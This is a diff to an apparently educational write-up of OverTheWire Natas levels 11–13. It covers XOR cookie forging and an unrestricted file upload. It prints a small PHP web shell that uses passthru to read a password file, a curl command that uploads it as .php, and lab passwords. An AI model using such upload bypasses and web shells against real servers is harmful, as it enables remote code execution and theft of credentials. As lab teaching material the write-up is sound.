@@ -237,55 +237,7 @@ if($data["showpassword"] == "yes") {
 }
 ?>
 ```
-It means that if we can change the cookie so the field `showpassword` is set to `yes`, the page will show the next password. We also see in the source code this `PHP` code:
-```php
-<?
-$defaultdata = ;
-
-function xor_encrypt($in) {
-    $key = '<censored>';
-    $text = $in;
-    $outText = '';
-
-    // Iterate through each character
-    for($i=0;$i<strlen($text);$i++) {
-    $outText .= $text[$i] ^ $key[$i % strlen($key)];
-    }
-
-    return $outText;
-}
-
-function loadData($def) {
-    global $_COOKIE;
-    $mydata = $def;
-    if(array_key_exists("data", $_COOKIE)) {
-    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
-    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
-        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
-        $mydata['showpassword'] = $tempdata['showpassword'];
-        $mydata['bgcolor'] = $tempdata['bgcolor'];
-        }
-    }
-    }
-    return $mydata;
-}
-
-function saveData($d) {
-    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
-}
-
-$data = loadData($defaultdata);
-
-if(array_key_exists("bgcolor",$_REQUEST)) {
-    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
-        $data['bgcolor'] = $_REQUEST['bgcolor'];
-    }
-}
-
-saveData($data);
-?>
-```
-What happens here is that the server reads the cookie from the user and decodes it, so it can know what color it should change the background to, and more importantly, if it should show the password. The data is being decoded in this line:
+It means that if we can change the cookie so the field `showpassword` is set to `yes`, the page will show the next password. We also see in the source code another `PHP` code, I will not bring the full code. What happens there is that the server reads the cookie from the user (`$_COOKIE`) and decodes it, so it can know what color it should change the background to, and more importantly, if it should show the password. The data is being decoded in this line:
 ```php
 $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
 ```
@@ -333,3 +285,36 @@ print $cookie
 We clone the encryption process of the server, but manipulate the cookie `data` so `showpassword` will be set to `"yes"`. To test it, I first tried it on the original data, when `showpassword` is set to `"no"`, and i got the exact `data` in the cookie, so it works. We set the cookie `data` with the output of this function and refresh, and we got the next password.
 
 Password: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
+
+## Level 12 → 13
+This time the page wants us to upload an `JPEG` image. Looking at the given source code, we can see the `PHP` code for handling the uploaded file. The server gets the file and it's name, generates a random name for the file and saves it in a path that the user can access. What's interesting here is this function:
+```php
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+```
+`$fn` is the file name given by the user. The server extract the extension of the file and creates the new file on the server with the same extension. It means that if we uploaded a file with `.jpg` extension, the extension of the file that the server creates will also be `.jpg`. But, if we upload a `.php` file, the file on the server also will be a `.php` file, and we will be able to run a `php` code.
+
+```php
+<?php
+    print passthru("cat /etc/natas\_webpass/natas13");
+?>
+```
+We created a file that runs a `php` code. It executes `cat` on the password file and prints it. But when we upload it from the website, the extension of the file being created is `.jpg`. Looking at the sourcecode again, we can see that line inside the upload form:
+```php
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+```
+This line prevents our file from bein `.php`, all files being uploaded will end with `.jpg` because of that value. We need another way to upload the file.
+
+```bash
+curl -X POST -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB natas12.natas.labs.overthewire.org/index.php -F "filename=file.php" -F "uploadedfile=@file.php"
+```
+We use `curl` in order to upload the file, this way we control `"filename"` and not the website form. We use `-X POST` to set the request as `POST` and `-F` flag is used to replicate a form input value, `@` before the file name attaches that file to the request. In the response from the server, we see this line:
+```html
+The file <a href="upload/w0wsxduq4q.php">upload/w0wsxduq4q.php</a> has been uploaded
+```
+So the file successfully uploaded to the server with the `.php` extension as we wanted. When we visit the path `upload/w0wsxduq4q.php` the malicious code inside the file is executed and the password is printed.
+
+Password: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
+
